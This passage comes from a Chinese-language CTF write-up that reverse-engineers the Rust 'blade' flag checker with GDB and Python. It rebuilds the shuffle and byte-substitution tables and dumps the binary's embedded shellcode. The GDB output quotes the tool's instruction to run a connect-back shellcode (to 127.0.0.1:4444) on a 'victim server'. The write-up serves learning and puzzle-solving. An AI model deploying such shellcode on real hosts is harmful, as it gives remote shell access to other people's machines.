+<li>用 python 字典建立映射表和反映射表：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">original = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line">char_to_shuffled_map = &#123;c: shuffled[i] <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)&#125;</span><br><span class="line">suffled_to_char_map = &#123;shuffled[i]: c <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<ol start="2">
+<li>再來要建立按位加密的映射表：</li>
+</ol>
+<ul>
+<li>下斷點：</li>
+</ul>
+<p>斷點這次會下在按位加密後，外部循環前，從 IDA 左側的虛線可以很方便地去判斷迴圈架構：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/blade_enc.png"
+                      alt="enc"
+                ><br>選擇下在 <code>cmp     r13d, 100h</code> 的位置，也就是 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab + 42E</code>。</p>
+<ul>
+<li>GDB 動態分析：<br>操作大部分和前面類似，值得一題的是加密後的 flag 會有不可視字元，所以這裡換成十六進位顯示：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb -q ./blade</span><br><span class="line">gef➤  starti</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 1 at 0x55555556709e</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:56514</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;\223\377;\330jd\237\n\331\f\354\263\302X\253\255\217&quot;</span>, &lt;incomplete sequence \340&gt;</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x93    0xff    0x3b    0xd8    0x6a    0x64    0x9f    0x0a</span><br><span class="line">0x5555555d63e8: 0xd9    0x0c    0xec    0xb3    0xc2    0x58    0xab    0xad</span><br><span class="line">0x5555555d63f0: 0x8f    0xe0    0x00    0x1e    0x2d    0x39    0x6b    0x6c</span><br><span class="line">0x5555555d63f8: 0x81    0xe1    0x5b    0xaf    0x9c    0x09    0x04    0xa0</span><br><span class="line">0x5555555d6400: 0x32    0x7e    0x79    0x03    0xcb    0x71    0x75    0x61</span><br><span class="line">0x5555555d6408: 0xfd    0xc1    0xef    0x2e    0x14    0x0b    0x66    0xca</span><br><span class="line">0x5555555d6410: 0xa4    0xa2    0xee    0x97    0x3a    0xb7    0x0f    0x86</span><br><span class="line">0x5555555d6418: 0x99    0x74    0xed    0xd2    0x02    0x1c    0xda    0xe2</span><br></pre></td></tr></table></figure></div>
+拿到加密的映射表了，但只有一部分。我們可以透過 GDB 的功能直接設定換位後加密前的 flag 為特定的值，然後重複直到建立完整的映射表，其中設特定值的部分也可以用 GDB 的 python API 來協助完成，做法如下：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 2 at 0x55555556709e</span><br><span class="line">gef➤  python</span><br><span class="line">&gt;start_addr = gdb.parse_and_eval(<span class="string">&quot;<span class="variable">$rbx</span>&quot;</span>)</span><br><span class="line">&gt;bytes_to_write = bytes(range(64))</span><br><span class="line">&gt;gdb.selected_inferior().write_memory(start_addr, bytes_to_write)</span><br><span class="line">&gt;end</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span><br><span class="line">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span><br><span class="line">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span><br><span class="line">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span><br><span class="line">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span><br><span class="line">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span><br><span class="line">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span><br><span class="line">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span><br><span class="line">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span><br><span class="line">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span><br><span class="line">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span><br><span class="line">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span><br><span class="line">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span><br><span class="line">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span><br><span class="line">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span><br></pre></td></tr></table></figure></div>
+上面的操作重複 <code>256/64 = 4</code> 次即可得到完整的加密映射表，用 python 來協助我們 parse string 還有建立映射：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_list = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_list.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line">encryption_mapping = &#123;plain: encrypted <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line">decryption_mapping = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br></pre></td></tr></table></figure></div>
+讚。到這邊我們已經可以完全模擬它對輸入的所有操作了。<br>不過有個大問題：這題是一個 flag checker，可是剛剛前面我們已經用 IDA 把 <code>verify()</code> 整個看過一遍也沒發現任何在檢查 flag 的部分，只看到他寫了 255 個 bytes 到一塊新的空間還有寫 64 個 bytes 到 <code>dest</code>，還有一些 TCP 的操作，但就不知道他後面在忙什麼QQ<br>後來看了其他人的 writeup 後發現原來寫入的 255 byets 是一段 shellcode，那這樣我們可以用 <code>pwntool.disasm</code> 來協助我們分析這段 shellcode，gogo。</li>
+</ul>
+<ol>
+<li>Shellcode 2 Assembly</li>
+</ol>
+<ul>
+<li>下斷點</li>
+</ul>
+<p>我們把斷點下在剛 call 完寫入 shellcode 的地方，然後因為前面剛 <code>alloc()</code> 一塊空間給 shellcode 所以位址就會在 $rax：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000130B2                 call    _ZN5alloc7raw_vec19RawVec$LT$T$C$A$GT$11allocate_in17h9362616e9151d1f3E ; alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::h9362616e9151d1f3</span><br><span class="line">.text:00000000000130B7                 mov     r14, rax</span><br><span class="line">.text:00000000000130BA                 mov     r15, rdx</span><br><span class="line">.text:00000000000130BD                 lea     rsi, unk_62B2B  ; src</span><br><span class="line">.text:00000000000130C4                 mov     edx, 0FFh       ; n</span><br><span class="line">.text:00000000000130C9                 mov     rdi, rax        ; dest</span><br><span class="line">.text:00000000000130CC                 call    cs:memcpy_ptr</span><br><span class="line">.text:00000000000130D2                 mov     [rsp+288h+memoryBuffer], r14</span><br></pre></td></tr></table></figure></div>
+<p>也就是 <code>mov     [rsp+288h+memoryBuffer], r14</code>。</p>
+<ul>
+<li>GDB dump shellcode<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x462</span><br><span class="line">Breakpoint 4 at 0x5555555670d2</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:56746</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x00005555555670d2 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/255xb <span class="variable">$rax</span></span><br><span class="line">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span><br><span class="line">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span><br><span class="line">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span><br><span class="line">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span><br><span class="line">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span><br><span class="line">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span><br><span class="line">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span><br><span class="line">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span><br><span class="line">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span><br><span class="line">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span><br><span class="line">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span><br><span class="line">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span><br><span class="line">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span><br><span class="line">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span><br><span class="line">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span><br><span class="line">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span><br><span class="line">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span><br><span class="line">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span><br><span class="line">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span><br><span class="line">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span><br><span class="line">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span><br><span class="line">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span><br><span class="line">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span><br><span class="line">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span><br><span class="line">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span><br><span class="line">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span><br><span class="line">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span><br><span class="line">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span><br></pre></td></tr></table></figure></div></li>
